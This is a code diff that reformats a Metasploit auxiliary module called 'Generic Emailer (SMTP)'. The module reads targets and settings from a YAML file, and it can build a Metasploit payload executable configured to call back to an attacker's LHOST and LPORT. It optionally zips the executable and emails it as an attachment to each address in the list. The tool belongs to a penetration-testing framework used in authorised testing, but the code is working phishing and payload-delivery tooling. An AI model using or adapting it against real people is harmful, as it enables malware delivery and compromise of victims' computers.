@@ -14,27 +14,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::EXE
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Generic Emailer (SMTP)',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Generic Emailer (SMTP)',
+        'Description' => %q{
           This module can be used to automate email delivery.
-        This code is based on Joshua Abraham's email script for social
-        engineering.
-      },
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+          This code is based on Joshua Abraham's email script for social
+          engineering.
+        },
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://spl0it.org/' ],
         ],
-      'Author'         => [ 'et <et[at]metasploit.com>' ]))
+        'Author' => [ 'et <et[at]metasploit.com>' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('RHOST', [true, "SMTP server address",'127.0.0.1']),
-          OptPort.new('RPORT', [true, "SMTP server port", 25]),
-          OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",
-            File.join(Msf::Config.data_directory,"emailer_config.yaml")]),
-        ])
+    register_options(
+      [
+        OptString.new('RHOST', [true, 'SMTP server address', '127.0.0.1']),
+        OptPort.new('RPORT', [true, 'SMTP server port', 25]),
+        OptString.new('YAML_CONFIG', [
+          true, 'Full path to YAML Configuration file',
+          File.join(Msf::Config.data_directory, 'emailer_config.yaml')
+        ]),
+      ]
+    )
 
     # Hide this option from the user
     deregister_options('MAILTO')
@@ -44,32 +55,32 @@ class MetasploitModule < Msf::Auxiliary
   def load_yaml_conf
     opts = {}
 
-    File.open(datastore['YAML_CONFIG'], "rb") do |f|
-      yamlconf = YAML::load(f)
+    File.open(datastore['YAML_CONFIG'], 'rb') do |f|
+      yamlconf = YAML.safe_load(f)
 
-      opts['to']                   = yamlconf['to']
-      opts['from']                 = yamlconf['from']
-      opts['subject']              = yamlconf['subject']
-      opts['type']                 = yamlconf['type']
-      opts['msg_file']             = yamlconf['msg_file']
-      opts['wait']                 = yamlconf['wait']
-      opts['add_name']             = yamlconf['add_name']
-      opts['sig']                  = yamlconf['sig']
-      opts['sig_file']             = yamlconf['sig_file']
-      opts['attachment']           = yamlconf['attachment']
-      opts['attachment_file']      = yamlconf['attachment_file']
+      opts['to'] = yamlconf['to']
+      opts['from'] = yamlconf['from']
+      opts['subject'] = yamlconf['subject']
+      opts['type'] = yamlconf['type']
+      opts['msg_file'] = yamlconf['msg_file']
+      opts['wait'] = yamlconf['wait']
+      opts['add_name'] = yamlconf['add_name']
+      opts['sig'] = yamlconf['sig']
+      opts['sig_file'] = yamlconf['sig_file']
+      opts['attachment'] = yamlconf['attachment']
+      opts['attachment_file'] = yamlconf['attachment_file']
       opts['attachment_file_type'] = yamlconf['attachment_file_type']
       opts['attachment_file_name'] = yamlconf['attachment_file_name']
 
       ### payload options ###
-      opts['make_payload']         = yamlconf['make_payload']
-      opts['zip_payload']          = yamlconf['zip_payload']
-      opts['msf_port']             = yamlconf['msf_port']
-      opts['msf_ip']               = yamlconf['msf_ip']
-      opts['msf_payload']          = yamlconf['msf_payload']
-      opts['msf_filename']         = yamlconf['msf_filename']
-      opts['msf_change_ext']       = yamlconf['msf_change_ext']
-      opts['msf_payload_ext']      = yamlconf['msf_payload_ext']
+      opts['make_payload'] = yamlconf['make_payload']
+      opts['zip_payload'] = yamlconf['zip_payload']
+      opts['msf_port'] = yamlconf['msf_port']
+      opts['msf_ip'] = yamlconf['msf_ip']
+      opts['msf_payload'] = yamlconf['msf_payload']
+      opts['msf_filename'] = yamlconf['msf_filename']
+      opts['msf_change_ext'] = yamlconf['msf_change_ext']
+      opts['msf_payload_ext'] = yamlconf['msf_payload_ext']
     end
 
     opts
@@ -85,39 +96,38 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
     yamlconf = load_yaml_conf
 
-    fileto               = yamlconf['to']
-    from                 = yamlconf['from']
-    subject              = yamlconf['subject']
-    type                 = yamlconf['type']
-    msg_file             = yamlconf['msg_file']
-    wait                 = yamlconf['wait']
-    add_name             = yamlconf['add_name']
-    sig                  = yamlconf['sig']
-    sig_file             = yamlconf['sig_file']
-    attachment           = yamlconf['attachment']
-    attachment_file      = yamlconf['attachment_file']
+    fileto = yamlconf['to']
+    from = yamlconf['from']
+    subject = yamlconf['subject']
+    type = yamlconf['type']
+    msg_file = yamlconf['msg_file']
+    wait = yamlconf['wait']
+    add_name = yamlconf['add_name']
+    sig = yamlconf['sig']
+    sig_file = yamlconf['sig_file']
+    attachment = yamlconf['attachment']
+    attachment_file = yamlconf['attachment_file']
     attachment_file_type = yamlconf['attachment_file_type']
     attachment_file_name = yamlconf['attachment_file_name']
 
-    make_payload         = yamlconf['make_payload']
-    zip_payload          = yamlconf['zip_payload']
-    msf_port             = yamlconf['msf_port']
-    msf_ip               = yamlconf['msf_ip']
-    msf_payload          = yamlconf['msf_payload']
-    msf_filename         = yamlconf['msf_filename']
-    msf_change_ext       = yamlconf['msf_change_ext']
-    msf_payload_ext      = yamlconf['msf_payload_ext']
+    make_payload = yamlconf['make_payload']
+    zip_payload = yamlconf['zip_payload']
+    msf_port = yamlconf['msf_port']
+    msf_ip = yamlconf['msf_ip']
+    msf_payload = yamlconf['msf_payload']
+    msf_filename = yamlconf['msf_filename']
+    msf_change_ext = yamlconf['msf_change_ext']
+    msf_payload_ext = yamlconf['msf_payload_ext']
 
     tmp = Dir.tmpdir
 
     datastore['MAILFROM'] = from
 
-    msg       = load_file(msg_file)
+    msg = load_file(msg_file)
 
-    if (type !~ /text/i and type !~ /text\/html/i)
+    if type !~ /text/i && type !~ %r{text/html}i
       print_error("YAML config: #{type}")
     end
 
@@ -125,9 +135,9 @@ class MetasploitModule < Msf::Auxiliary
       attachment_file = File.join(tmp, msf_filename)
       attachment_file_name = msf_filename
 
-      print_status("Creating payload...")
+      print_status('Creating payload...')
       mod = framework.payloads.create(msf_payload)
-      if (not mod)
+      if !mod
         print_error("Failed to create payload, #{msf_payload}")
         return
       end
@@ -136,17 +146,17 @@ class MetasploitModule < Msf::Auxiliary
       # framework to pick one for us.  In general this is the best
       # way to encode.
       buf = mod.generate_simple(
-          'Format'  => 'raw',
-          'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
-        )
+        'Format' => 'raw',
+        'Options' => { 'LHOST' => msf_ip, 'LPORT' => msf_port }
+      )
       exe = generate_payload_exe({
-          :code => buf,
-          :arch => mod.arch,
-          :platform => mod.platform
-        })
+        code: buf,
+        arch: mod.arch,
+        platform: mod.platform
+      })
 
       print_status("Writing payload to #{attachment_file}")
-      File.open(attachment_file, "wb") do |f|
+      File.open(attachment_file, 'wb') do |f|
         f.write(exe)
       end
 
@@ -161,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
         zip_file = attachment_file.sub(/\.\w+$/, '.zip')
         print_status("Zipping payload to #{zip_file}")
         File.write(zip_file, Msf::Util::EXE.to_zip([fname: File.basename(attachment_file), data: exe]), mode: 'wb')
-        attachment_file      = zip_file
+        attachment_file = zip_file
         attachment_file_type = 'application/zip'
       else
         attachment_file_type = 'application/exe'
@@ -169,16 +179,14 @@ class MetasploitModule < Msf::Auxiliary
 
     end
 
-
     File.open(fileto, 'rb').each do |l|
-      next if l !~ /\@/
+      next if l !~ /@/
 
       nem = l.split(',')
       name = nem[0].split(' ')
       fname = name[0]
-      lname = name[1]
+      _lname = name[1]
       email = nem[1].strip
-
 
       if add_name
         email_msg_body = "#{fname},\n\n#{msg}"
@@ -201,19 +209,17 @@ class MetasploitModule < Msf::Auxiliary
       datastore['MAILTO'] = email.strip
       mime_msg.subject = subject
 
-      mime_msg.add_part(Rex::Text.encode_base64(email_msg_body, "\r\n"), type, "base64", "inline")
+      mime_msg.add_part(Rex::Text.encode_base64(email_msg_body, "\r\n"), type, 'base64', 'inline')
 
-      if attachment
-        if attachment_file_name
-          data_attachment = load_file(attachment_file)
-          mime_msg.add_part(Rex::Text.encode_base64(data_attachment, "\r\n"), attachment_file_type, "base64", "attachment; filename=\"#{attachment_file_name}\"")
-        end
+      if attachment && attachment_file_name
+        data_attachment = load_file(attachment_file)
+        mime_msg.add_part(Rex::Text.encode_base64(data_attachment, "\r\n"), attachment_file_type, 'base64', "attachment; filename=\"#{attachment_file_name}\"")
       end
 
       send_message(mime_msg.to_s)
-      select(nil,nil,nil,wait)
+      select(nil, nil, nil, wait)
     end
 
-    print_status("Email sent..")
+    print_status('Email sent..')
   end
 end
